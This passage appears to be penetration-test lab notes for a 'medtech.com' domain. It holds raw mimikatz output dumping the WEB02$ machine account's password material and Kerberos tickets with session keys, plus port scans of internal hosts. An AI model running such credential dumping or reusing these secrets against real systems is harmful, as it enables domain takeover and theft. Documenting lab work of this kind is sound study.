  * Username : (null)
  * Domain   : (null)
  * Password : (null)

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 47684 (00000000:0000ba44)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-96-0-0

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 47650 (00000000:0000ba22)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-96-0-1

  * Username : WEB02$
  * Domain   : medtech.com
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 4/8/2024 12:06:45 PM
SID               : S-1-5-18

  * Username : web02$
  * Domain   : MEDTECH.COM
  * Password : 72 33 71 ea 51 dd 81 01 83 89 46 39 12 2e d2 03 71 48 99 0d 34 d9 53 22 eb e4 bb 3d 28 79 af f1 7b c4 3b d7 95 8f bc 59 2e 66 b3 83 7b 0b 0f a8 7b b2 ff 51 9e b4 64 e0 4a 61 a7 dd fc 17 24 b0 23 87 d2 eb f3 bd 7b 01 43 9d 96 96 c3 1e ea 8f d7 64 d9 03 fd 0f ff 1a ab 1b 35 d5 00 a8 fa 39 e6 e9 fb 1a d7 51 91 8a d0 d1 d1 9f a2 c5 90 a6 4f 43 0f dd a5 59 57 e1 b2 de db e6 6c 7e 26 57 a7 b9 70 ec 33 74 f5 d5 30 49 08 2a cb 5b c0 fa 80 e0 e7 35 24 59 9a 28 22 30 bc 08 3b 7d a9 b0 ed f8 32 a8 6f ab f2 88 31 c6 9c 4c e2 4f 15 f1 02 b6 6c 70 70 07 6b 4c ac 1c 2c bf d9 02 26 ae e9 f6 ce 4d 65 83 a7 3c 0a 1d 1c 2d 02 1c bd cc 93 d4 ff 0f d9 ce 54 95 b7 c0 c7 42 f7 f5 7c 47 17 fa 0f 4d 69 b4 2f 89 65 f7 4e d1 83 f8 8a 9f 

 Group 0 - Ticket Granting Service
  [00000000]
    Start/End/MaxRenew: 8/6/2025 4:23:07 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : ldap ; dc01.medtech.com ; @ MEDTECH.COM
    Target Name  (02) : ldap ; dc01.medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      24094d6f6d888a5ba8bfd71eb56b8db7800dfccdb988e4d485572e163c08486d
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]
  [00000001]
    Start/End/MaxRenew: 8/6/2025 4:18:37 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : cifs ; DC01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Target Name  (02) : cifs ; DC01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( medtech.com )
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      21e424d09f9467c7ad6b3106d79a3d15d9a08f64e97691934ca1074d943faf20
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]
  [00000002]
    Start/End/MaxRenew: 8/6/2025 4:18:37 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (01) : WEB02$ ; @ MEDTECH.COM
    Target Name  (01) : WEB02$ ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      1315041881c6ec374bcced84e23bca3e49e846693a8d4c6d385e43946bfac634
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3 [...]
  [00000003]
    Start/End/MaxRenew: 8/6/2025 4:18:29 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : ldap ; DC01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Target Name  (02) : ldap ; DC01.medtech.com ; medtech.com ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( MEDTECH.COM )
    Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      54c5c6238d41a63c03f01e860096ad92502983f2681facaba960e260f47c20ae
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 8 [...]

 Group 1 - Client Ticket ?

 Group 2 - Ticket Granting Ticket
  [00000000]
    Start/End/MaxRenew: 8/6/2025 4:18:37 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Target Name  (--) : @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( $$Delegation Ticket$$ )
    Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      ad5be66adad55ad0c0bf097866b28b3001f9b515669185248e8b899a865669c8
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2 [...]
  [00000001]
    Start/End/MaxRenew: 8/6/2025 4:18:29 AM ; 8/6/2025 2:18:29 PM ; 8/13/2025 4:18:29 AM
    Service Name (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Target Name  (02) : krbtgt ; MEDTECH.COM ; @ MEDTECH.COM
    Client Name  (01) : WEB02$ ; @ MEDTECH.COM ( MEDTECH.COM )
    Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 
    Session Key       : 0x00000001 - des_cbc_crc      
      89fd0f5648feddd80f272810cb9e2b87a10432285143bc1ac3ae2ce87e2253b4
    Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2 [...]

mimikatz(commandline) # exit
Bye!
```
## 192.168.x.122
```

```

# Internal
## 172.16.x.10
portscan
```
PORT    STATE    SERVICE      REASON      VERSION
53/tcp  filtered domain       no-response
88/tcp  filtered kerberos-sec no-response
135/tcp filtered msrpc        no-response
139/tcp filtered netbios-ssn  no-response
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing an open TCP port so results incomplete
Aggressive OS guesses: Sanyo PLC-XU88 digital video projector (95%), Linux 2.6.18 (93%), Buffalo BS-GS switch (92%), Printronix T5304 label printer (92%), Asus WL-500gP wireless broadband router (92%), AXIS 70U Network Document Server (92%), Brother HL-2700CN printer (92%), Brother MFC-7820N printer (92%), IBM 6400 printer (software version 7.0.9.6) (92%), Intel Express 510T, 520T, or 550T switch (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/6%OT=%CT=%CU=%PV=Y%G=N%TM=68937F0D%P=x86_64-pc-linux-gnu)
SEQ(CI=I)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=N)
```
## 172.16.x.11
portscan
```

```

windows enum
```

```
## 172.16.x.12
portscan
```
Open 172.16.229.12:139
Open 172.16.229.12:135
Open 172.16.229.12:445
Open 172.16.229.12:3389
Open 172.16.229.12:5985
```
## 172.16.x.13
portscan
```

```
